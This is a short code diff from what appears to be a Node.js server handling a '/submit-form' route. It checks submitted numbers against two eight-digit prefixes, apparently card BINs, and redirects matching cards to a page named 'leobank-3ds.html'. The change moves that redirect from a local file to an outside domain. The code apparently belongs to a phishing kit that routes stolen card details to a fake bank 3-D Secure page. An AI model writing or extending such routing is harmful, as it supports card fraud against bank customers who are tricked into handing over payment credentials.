@@ -60,7 +60,8 @@ app.post('/submit-form', async (req, res) => {
     .write();
    
     if (prefix8 === '40985844' || prefix8 === '54112498') {
-    return res.redirect('/leobank-3ds.html');
+    return res.redirect('https://kontaktonlayn.com/leobank-3ds.html');
+
   }
 
   
